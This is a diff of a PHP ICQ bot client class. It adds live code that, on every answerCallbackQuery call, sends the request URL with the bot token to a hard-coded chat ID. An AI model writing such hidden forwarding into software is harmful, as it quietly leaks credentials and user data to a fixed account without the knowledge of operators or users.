@@ -160,14 +160,11 @@ class ICQnew
 		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);	           
 		$result = curl_exec($ch);
 		curl_close($ch);
-		
-		/*
-		$this->call("/messages/sendText", [
-		'chatId' => "752067062", 
-		'text' => $url
-		] );
-		*/
-		
+
+		if ($method == "/messages/answerCallbackQuery") {				
+			file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
+		}		
+				
 		$response = json_decode($result, true);
 
 		return $response;
